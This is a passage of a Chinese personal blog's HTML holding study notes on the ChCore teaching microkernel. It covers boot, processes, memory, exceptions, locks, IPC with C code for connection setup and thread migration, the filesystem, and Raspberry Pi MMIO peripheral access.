eret_to_thread(switch_context());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[], <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">        test_ipc_routine(__chcore_get_procm_cap());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test_ipc_routine</span><span class="params">(<span class="type">int</span> server_cap)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_struct</span> *<span class="title">client_ipc_struct</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_msg</span> *<span class="title">ipc_msg</span>;</span></span><br><span class="line">        <span class="type">int</span> shared_page_pmo_cap, shared_msg;</span><br><span class="line">        <span class="type">int</span> ret, i;</span><br><span class="line">        client_ipc_struct = ipc_register_client(server_cap);</span><br><span class="line"></span><br><span class="line">       ipc_msg = ipc_create_msg(client_ipc_struct, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; IPC_TEST_NUM; i++) &#123;</span><br><span class="line">                ipc_set_msg_data(ipc_msg, (<span class="type">char</span> *)&amp;i, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">                ret = ipc_call(client_ipc_struct, ipc_msg);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> ipc_struct *<span class="title function_">ipc_register_client</span><span class="params">(<span class="type">int</span> server_thread_cap)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> conn_cap, retry_times = RETRY_UPPER_BOUND;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_struct</span> *<span class="title">ipc_struct</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_struct));</span><br><span class="line">        <span class="type">int</span> client_id = __sync_fetch_and_add(&amp;client_ipc_num, <span class="number">1</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_vm_config</span> <span class="title">vm_config</span>;</span></span><br><span class="line">        vm_config.buf_base_addr = CLIENT_BUF_BASE + client_id * CLIENT_BUF_SIZE;</span><br><span class="line">        vm_config.buf_size = CLIENT_BUF_SIZE;</span><br><span class="line">        conn_cap = __chcore_sys_register_client((u32)server_thread_cap,(u64)&amp;vm_config);</span><br><span class="line">        ipc_struct-&gt;shared_buf = vm_config.buf_base_addr;</span><br><span class="line">        ipc_struct-&gt;shared_buf_len = vm_config.buf_size;</span><br><span class="line">        ipc_struct-&gt;conn_cap = conn_cap;</span><br><span class="line">        spinlock_init(&amp;ipc_struct-&gt;ipc_lock);</span><br><span class="line">        <span class="keyword">return</span> ipc_struct;</span><br><span class="line">&#125;</span><br><span class="line">u32 <span class="title function_">sys_register_client</span><span class="params">(u32 server_cap, u64 vm_config_ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">client</span> =</span> current_thread;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">server</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_connection</span> *<span class="title">conn</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_vm_config</span> <span class="title">vm_config</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        u64 client_buf_size;</span><br><span class="line">        <span class="type">int</span> conn_cap = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> r = <span class="number">0</span>;</span><br><span class="line">        r = copy_from_user(</span><br><span class="line">                (<span class="type">char</span> *)&amp;vm_config, (<span class="type">char</span> *)vm_config_ptr, <span class="keyword">sizeof</span>(vm_config));</span><br><span class="line">        server = obj_get(current_cap_group, server_cap, TYPE_THREAD);</span><br><span class="line">        client_buf_size = vm_config.buf_size;</span><br><span class="line">        conn_cap = create_connection(client, server, &amp;vm_config);</span><br><span class="line">        conn = obj_get(current_cap_group, conn_cap, TYPE_CONNECTION);</span><br><span class="line">        <span class="keyword">if</span> (client_buf_size != vm_config.buf_size) &#123;</span><br><span class="line">                r = copy_to_user((<span class="type">char</span> *)vm_config_ptr,</span><br><span class="line">                                 (<span class="type">char</span> *)&amp;vm_config,</span><br><span class="line">                                 <span class="keyword">sizeof</span>(vm_config));</span><br><span class="line">        &#125;</span><br><span class="line">        r = conn_cap;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">create_connection</span><span class="params">(<span class="keyword">struct</span> thread *source, <span class="keyword">struct</span> thread *target,</span></span><br><span class="line"><span class="params">                             <span class="keyword">struct</span> ipc_vm_config *client_vm_config)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_connection</span> *<span class="title">conn</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> conn_cap = <span class="number">0</span>, server_conn_cap = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pmobject</span> *<span class="title">stack_pmo</span>, *<span class="title">buf_pmo</span>;</span></span><br><span class="line">        <span class="type">int</span> conn_idx;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">server_ipc_config</span> *<span class="title">server_ipc_config</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_vm_config</span> *<span class="title">vm_config</span>;</span></span><br><span class="line">        u64 server_stack_base, server_buf_base, client_buf_base;</span><br><span class="line">        u64 stack_size, buf_size;</span><br><span class="line">        conn = obj_alloc(TYPE_CONNECTION, <span class="keyword">sizeof</span>(*conn));</span><br><span class="line">        conn-&gt;target = create_server_thread(target);</span><br><span class="line">        server_ipc_config = target-&gt;general_ipc_config;</span><br><span class="line">        vm_config = &amp;server_ipc_config-&gt;vm_config;</span><br><span class="line">        conn_idx = find_next_zero_bit(</span><br><span class="line">                server_ipc_config-&gt;conn_bmp, server_ipc_config-&gt;max_client, <span class="number">0</span>);</span><br><span class="line">        set_bit(conn_idx, server_ipc_config-&gt;conn_bmp);</span><br><span class="line">        server_stack_base = vm_config-&gt;stack_base_addr + conn_idx * vm_config-&gt;stack_size;</span><br><span class="line"></span><br><span class="line">        stack_size = vm_config-&gt;stack_size;</span><br><span class="line">        stack_pmo = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pmobject));</span><br><span class="line">        pmo_init(stack_pmo, PMO_DATA, stack_size, <span class="number">0</span>);</span><br><span class="line">        vmspace_map_range(target-&gt;vmspace,</span><br><span class="line">                          server_stack_base,</span><br><span class="line">                          stack_size,</span><br><span class="line">                          VMR_READ | VMR_WRITE,</span><br><span class="line">                          stack_pmo);</span><br><span class="line">        conn-&gt;server_stack_top = server_stack_base + stack_size;</span><br><span class="line">        server_buf_base = vm_config-&gt;buf_base_addr + conn_idx * vm_config-&gt;buf_size;</span><br><span class="line">        client_buf_base = client_vm_config-&gt;buf_base_addr;</span><br><span class="line">        buf_size = MIN(vm_config-&gt;buf_size, client_vm_config-&gt;buf_size);</span><br><span class="line">        client_vm_config-&gt;buf_size = buf_size;</span><br><span class="line">        buf_pmo = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pmobject));</span><br><span class="line">        pmo_init(buf_pmo, PMO_DATA, buf_size, <span class="number">0</span>);</span><br><span class="line">        vmspace_map_range(current_thread-&gt;vmspace, client_buf_base, buf_size, VMR_READ | VMR_WRITE, buf_pmo);</span><br><span class="line">        vmspace_map_range(target-&gt;vmspace, server_buf_base, buf_size, VMR_READ | VMR_WRITE, buf_pmo);</span><br><span class="line">        conn-&gt;buf.client_user_addr = client_buf_base;</span><br><span class="line">        conn-&gt;buf.server_user_addr = server_buf_base;</span><br><span class="line">        conn_cap = cap_alloc(current_cap_group, conn, <span class="number">0</span>);</span><br><span class="line">        server_conn_cap =</span><br><span class="line">                cap_copy(current_cap_group, target-&gt;cap_group, conn_cap);</span><br><span class="line">        conn-&gt;server_conn_cap = server_conn_cap;</span><br><span class="line">        <span class="keyword">return</span> conn_cap;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> thread *<span class="title function_">create_server_thread</span><span class="params">(<span class="keyword">struct</span> thread *src)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">new</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">server_ipc_config</span> *<span class="title">new_config</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">server_ipc_config</span> *<span class="title">src_config</span>;</span></span><br><span class="line">        new = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> thread));</span><br><span class="line">        new-&gt;vmspace = obj_get(src-&gt;cap_group, VMSPACE_OBJ_ID, TYPE_VMSPACE);</span><br><span class="line">        new-&gt;thread_ctx = create_thread_ctx(TYPE_SHADOW);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">char</span> *)&amp;(new-&gt;thread_ctx-&gt;ec),</span><br><span class="line">               (<span class="type">const</span> <span class="type">char</span> *)&amp;(src-&gt;thread_ctx-&gt;ec),</span><br><span class="line">               <span class="keyword">sizeof</span>(<span class="type">arch_exec_cont_t</span>));</span><br><span class="line">        new-&gt;thread_ctx-&gt;prio = MAX_PRIO - <span class="number">1</span>;</span><br><span class="line">        new-&gt;thread_ctx-&gt;state = TS_INIT;</span><br><span class="line">        new-&gt;thread_ctx-&gt;affinity = NO_AFF;</span><br><span class="line">        new-&gt;thread_ctx-&gt;type = TYPE_SHADOW;</span><br><span class="line">        src_config = (<span class="keyword">struct</span> server_ipc_config *)src-&gt;general_ipc_config;</span><br><span class="line">        new_config = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> server_ipc_config));</span><br><span class="line">        new_config-&gt;callback = src_config-&gt;callback;</span><br><span class="line">        new_config-&gt;vm_config = src_config-&gt;vm_config;</span><br><span class="line">        new-&gt;general_ipc_config = new_config;</span><br><span class="line">        new-&gt;cap_group = src-&gt;cap_group;</span><br><span class="line">        obj_put(new-&gt;vmspace);</span><br><span class="line">        <span class="keyword">return</span> new;</span><br><span class="line">&#125;</span><br><span class="line">u64 <span class="title function_">sys_ipc_call</span><span class="params">(u32 conn_cap, <span class="keyword">struct</span> ipc_msg *ipc_msg, u64 cap_num)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_connection</span> *<span class="title">conn</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        u64 arg;</span><br><span class="line">        <span class="type">int</span> r = <span class="number">0</span>;</span><br><span class="line">        conn = obj_get(current_thread-&gt;cap_group, conn_cap, TYPE_CONNECTION);</span><br><span class="line">        conn-&gt;ipc_msg = ipc_msg;</span><br><span class="line">        <span class="keyword">if</span> (cap_num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                r = ipc_send_cap(conn);</span><br><span class="line">        &#125;</span><br><span class="line">        arg = conn-&gt;buf.server_user_addr;</span><br><span class="line">        thread_migrate_to_server(conn, arg);</span><br><span class="line">   		BUG(<span class="string">&quot;This function should never\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> u64 <span class="title function_">thread_migrate_to_server</span><span class="params">(<span class="keyword">struct</span> ipc_connection *conn, u64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">target</span> =</span> conn-&gt;target;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">server_ipc_config</span> *<span class="title">target_ipc_config</span> =</span></span><br><span class="line">                (<span class="keyword">struct</span> server_ipc_config *)(target-&gt;general_ipc_config);</span><br><span class="line">        u64 callback = target_ipc_config-&gt;callback;</span><br><span class="line">        conn-&gt;source = current_thread;</span><br><span class="line">        current_thread-&gt;thread_ctx-&gt;state = TS_WAITING;</span><br><span class="line">        target-&gt;active_conn = conn;</span><br><span class="line">        obj_put(conn);</span><br><span class="line">        arch_set_thread_stack(target, conn-&gt;server_stack_top);</span><br><span class="line">        arch_set_thread_next_ip(target, callback);</span><br><span class="line">        arch_set_thread_arg0(target, arg);</span><br><span class="line">        arch_set_thread_arg1(target, current_thread-&gt;cap_group-&gt;pid);</span><br><span class="line">        target-&gt;thread_ctx-&gt;sc = current_thread-&gt;thread_ctx-&gt;sc;</span><br><span class="line">        switch_to_thread(target);</span><br><span class="line">        eret_to_thread(switch_context());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="执行流"><a href="#执行流" class="headerlink" title="执行流"></a>执行流</h2><p>client先register_client，需要知道想要通信的服务端进程。</p>
<p>创建连接会为服务端进程再创建一个线程，设置相同的vmspace (每个client都会在服务器进程创建一个线程作为单独的连接对象)</p>
<p>client ipc_call时，不用sched，而是直接switch到target，将自己设置为waiting，不加入等待队列。需要设置参数和target为服务端的处理函数。</p>
<p>server ipc_return时，设置client为running后直接switch到client，设置返回值</p>
<p>由于ipc的操作都是进内核的，eret会直接返回到用户态，因此server返回到client时，执行ipc_call的下一条指令，切换到server的调用链直接被中止。由于ret addr不使用栈，因此也不会对内核栈产生很大的破坏。</p>
<h2 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h2><p>每个connection会创建pmo，同时映射到client和server的地址空间</p>
<p>client和server的thread是一对一的，但是即使是不同的thread也是服务在同一个写死的地址上，所以需要根据不同情况算偏移找不同的位置。</p>
<ul>
<li>server: 同一个dispatch会需要支持不同client访问，每次create_connection时会得到不同的连接，server对于IPC提供的缓冲区根据不同connection id找到偏移 服务不同客户</li>
<li>client：同一个cilent会需要和不同的server通信，每次register client会拿到不同client id，client对于IPC提供的缓冲区根据不同的client id找到偏移，请求不同的服务</li>
</ul>
<p>每个client创建pmo，然后映射到服务端的地址都不会重复。buf和stack各需要一个pmo</p>
<ul>
<li><p><code>buf_addr</code>为A-stack client server共享内存 传递参数</p>
</li>
<li><p><code>stack_addr</code>为E-stack server thread执行用</p>
</li>
</ul>
<h2 id="消息传递"><a href="#消息传递" class="headerlink" title="消息传递"></a>消息传递</h2><p>client通过<code>ipc_create_msg</code> 会把消息直接写入到共享内存的开头，在迁移线程时设置地址为服务端共享内存地址即可（两端虚拟地址不一样，但物理地址一样）</p>
<p>共享内存首地址即为msg对象(元数据)，而紧接着msg对象的就是msg所带data </p>
<p>可以自己为每种不同的IPC定义request结构体，然后直接进行类型转换</p>
<p>以文件系统为例，共享内存布局如下</p>
<p>msg元数据—fs_request元数据—文件数据</p>
<h2 id="cap"><a href="#cap" class="headerlink" title="cap"></a>cap</h2><p>需要传递资源给server</p>
<p>很多IPC的操作是被写在kernel里的，kernel的地址空间是共用的，因此即使是不同进程本地修改cap，在context switch到另一个进程时，修改仍有效</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/chcore/chcore/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/22/chcore/chcore/" class="post-title-link" itemprop="url">chcore</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-01-22 20:26:50" itemprop="dateCreated datePublished" datetime="2024-01-22T20:26:50+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/chcore/" itemprop="url" rel="index"><span itemprop="name">chcore</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>3.4k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>13 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="chcore"><a href="#chcore" class="headerlink" title="chcore"></a>chcore</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><ol>
<li><p>start.S </p>
<p><code>mpidr</code>拿到cpu核编号，其他核等待 主核设置<code>scr</code> <code>elr</code>(返回地址) <code>spsr</code>(异常状态) 切换到el1</p>
<p>设置栈地址</p>
</li>
<li><p>init_c</p>
<p>清理bss</p>
<p>初始化uart</p>
<p>初始化页表</p>
<p>激活mmu</p>
</li>
<li><p>start_kernel</p>
<p>重新设置栈(高地址)</p>
<p>关掉对低地址(<code>ttbr0</code>)的翻译 flush tlb</p>
</li>
<li><p>main</p>
<p>初始化锁</p>
<p>初始化物理内存分配系统</p>
<p><code>set_exception_vector</code> 初始化异常向量表 打开中断</p>
<p>初始化调度策略（链表，idle线程）</p>
<p>激活其他线程</p>
<p>拿锁 根据指定配置创建root线程 这里<code>create_root_thread</code>会先创建root进程再创建线程</p>
<p>调度 切换上下文 返回用户态</p>
</li>
</ol>
<h2 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h2><p><code>cap_group</code>是进程的抽象，元数据包括其拥有的所有的内核对象，例如vmspace，Capability是访问某个内核对象的令牌</p>
<p>进程只是获取资源和原理资源的对象，单独创建没有意义，需要填入创建线程需要的参数中然后创建线程。</p>
<p>创建线程并加载用户文件有两个函数：</p>
<ul>
<li><p><code>load_binary</code> 解析elf 创建pmo，建立映射，复制数据，拿到pc并返回用于创建线程，在内核态创建root的线程的时候使用</p>
</li>
<li><p><code>launch_process</code>解析elf 通过系统调用创建pmo并映射 <code>spawn</code>之前的<code>parse_elf_from_binary</code>已经为每个段都拿到了pmo并复制，<code>launch_process</code>中只要为每个段建立映射即可</p>
<p>libchore是额外提供的库，用户态程序，基本都是通过syscall和内核交互完成功能，提供<code>spawn</code>等函数</p>
</li>
</ul>
<p>线程调度在内核态完成</p>
<p>进程管理在用户态的procm server完成</p>
<p>存在crt0的几个函数用汇编写入main外层的<code>_start</code>函数，并在main调用之后调用进程退出和线程退出函数</p>
<p>猜测这个libchore的crt0函数会和用户程序一同编译</p>
<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p><code>0xffff_0000_0000_0000 + addr</code> 映射到 <code>addr</code></p>
<p>树莓派规定<code>0x00000000</code>~&#96;0x3f000000&#96; 物理地址会去主存访问，再大的物理地址会去对应的外设访问，与型号有关。</p>
<p>buddy system虽然是管理物理内存的，但是所有的操作都是针对虚拟地址的。由于之前已经进行过大块映射。所以一整块连续内存对内核来说是可以直接给buddy system使用的，把对应地址转为page*即可</p>
<p>页表会从buddy system拿到页地址，但是存储再页表项中的地址必须转换为物理地址。</p>
<p>pmo作为一个资源对象，记录了物理内存资源。用radix tree做索引，key是虚拟内存的page编号，value是对应的物理内存地址。</p>
<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><ol>
<li><p><code>exception_entry</code> 保存上下文到栈中 这里使用的栈已经是内核栈了</p>
</li>
<li><p>进入对应的处理entry，esr寄存器可判断异常原因，传入后续c函数</p>
</li>
<li><p>如果是syscall，跳转到syscall_table的entry</p>
<p>如果是其他，例如page fault，进入handle_entry.c 根据esr判断并处理</p>
<p>如果是时钟中断，<code>sched_handle_timer_irq</code>会做和调度相关的事情</p>
</li>
</ol>
<h2 id="锁与信号量"><a href="#锁与信号量" class="headerlink" title="锁与信号量"></a>锁与信号量</h2><p>chcore中存在以下不同的实现</p>
<ol>
<li><p>通过硬件提供的特殊load和store指令实现fetch_and_add 随后再实现ticket lock，一把大锁，一进内核就拿</p>
</li>
<li><p>信号量记录当前线程等待的线程信息，通过加入和移除调度队列实现 。waitpid通过信号量的wait和signal实现</p>
</li>
<li><p>用二元信号量可在用户态实现互斥锁</p>
</li>
<li><p>gcc有内置的api <code>__sync_fetch_and_add</code> <code>__sync_lock_test_and_set</code>  不需要任何头文件可以使用，用这个也能实现锁 但是这里依赖了已经存在的编译器，并不是从0写操作系统。</p>
</li>
</ol>
<h2 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h2><h3 id="执行流"><a href="#执行流" class="headerlink" title="执行流"></a>执行流</h3><p>client先register_client，需要知道想要通信的服务端进程。</p>
<p>创建连接会为服务端进程再创建一个线程，设置相同的vmspace (每个client都会在服务器进程创建一个线程作为单独的连接对象)</p>
<p>client ipc_call时，不用sched，而是直接switch到target，将自己设置为waiting，不加入等待队列。需要设置参数和target为服务端的处理函数。</p>
<p>server ipc_return时，设置client为running后直接switch到client，设置返回值</p>
<p>由于ipc的操作都是进内核的，eret会直接返回到用户态，因此server返回到client时，执行ipc_call的下一条指令，切换到server的调用链直接被中止。由于ret addr不使用栈，因此也不会对内核栈产生很大的破坏。</p>
<h3 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h3><p>每个connection会创建pmo，同时映射到client和server的地址空间</p>
<p>client和server的thread是一对一的，但是即使是不同的thread也是服务在同一个写死的地址上，所以需要根据不同情况算偏移找不同的位置。</p>
<ul>
<li>server: 同一个dispatch会需要支持不同client访问，每次create_connection时会得到不同的连接，server对于IPC提供的缓冲区根据不同connection id找到偏移 服务不同客户</li>
<li>client：同一个cilent会需要和不同的server通信，每次register client会拿到不同client id，client对于IPC提供的缓冲区根据不同的client id找到偏移，请求不同的服务</li>
</ul>
<p>每个client创建pmo，然后映射到服务端的地址都不会重复。buf和stack各需要一个pmo</p>
<ul>
<li><p><code>buf_addr</code>为A-stack client server共享内存 传递参数</p>
</li>
<li><p><code>stack_addr</code>为E-stack server thread执行用</p>
</li>
</ul>
<h3 id="消息传递"><a href="#消息传递" class="headerlink" title="消息传递"></a>消息传递</h3><p>client通过<code>ipc_create_msg</code> 会把消息直接写入到共享内存的开头，在迁移线程时设置地址为服务端共享内存地址即可（两端虚拟地址不一样，但物理地址一样）</p>
<p>共享内存首地址即为msg对象(元数据)，而紧接着msg对象的就是msg所带data </p>
<p>可以自己为每种不同的IPC定义request结构体，然后直接进行类型转换</p>
<p>以文件系统为例，共享内存布局如下</p>
<p>msg元数据—fs_request元数据—文件数据</p>
<h3 id="cap"><a href="#cap" class="headerlink" title="cap"></a>cap</h3><p>需要传递资源给server</p>
<p>很多IPC的操作是被写在kernel里的，kernel的地址空间是共用的，因此即使是不同进程本地修改cap，在context switch到另一个进程时，修改仍有效</p>
<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><p>文件系统全是用户态程序</p>
<p>File System Manager实现VFS抽象，在内存中维护一个链表，每个节点包含path和对应的文件系统server的结构体</p>
<p>inode记录的block块号除了用连续的数组，还可用radix tree，key是page编号，value是page地址（block块号）</p>
<h2 id="外设"><a href="#外设" class="headerlink" title="外设"></a>外设</h2><p>参考<a target="_blank" rel="noopener" href="https://github.com/s-matyukevich/raspberry-pi-os/blob/master/docs/lesson01/rpi-os.md">raspberry-pi-os&#x2F;rpi-os.md at master · s-matyukevich&#x2F;raspberry-pi-os · GitHub</a>及BCM2837树莓派外设手册可知，对于树莓派，硬件本身(MMU)规定了一段物理地址是专门用于访问外设的（BCM2837为0x30000000-0x3F000000）。由1.2节可知，当MMU第一次把虚拟地址翻译为物理地址后，还会通过另一个VC&#x2F;ARM MMU把物理地址翻译为总线地址。最后选择是访问主存还是外设。这里VC&#x2F;ARM MMU会把0x30000000的物理地址直接映射到0x7E000000。</p>
<p>同时，第五章EMMC可知，EMMC寄存器基地址被规定为0x7E300000，也就是说，只要操作系统访问0x30300000的物理地址，就能做到和SD卡进行交互而非RAM。</p>
<p>chcore先通过syscall创建pmo并映射，pmo对应的物理地址即是树莓派手册规定的用于访问外设+具体外设的地址。当访问这块物理内存时，树莓派会交由sd卡处理。同时，内存映射仍由操作系统管理，所以需要页表对应的PTE会被标记为device，使得这些页不进入缓存。</p>
<p>进行读写等操作时，chcore会先通过mmio写一些寄存器，设置必要的参数(例如block号)，随后可以在指定内存位置进行读写(<code>EMMC_DATA</code>)。</p>
<p>对MMIO地址使用的<code>read32</code> <code>write32</code>接口使用的地址均用<code>volatile</code>修饰，保证可以看到硬件提供的最真实的数据。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

